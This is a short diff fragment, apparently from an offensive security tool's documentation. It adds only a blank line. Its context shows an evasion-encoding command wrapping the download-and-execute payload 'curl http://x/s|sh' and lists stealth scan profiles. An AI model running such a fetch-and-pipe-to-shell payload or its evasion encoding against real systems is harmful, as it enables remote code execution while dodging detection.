@@ -166,3 +166,4 @@ run evasion_encode --payload "curl http://x/s|sh"
 
 Stealth profiles: `noisy` | `balanced` | `ninja` (slower scans, fewer threads, policy blocks dangerous ops).
 
+
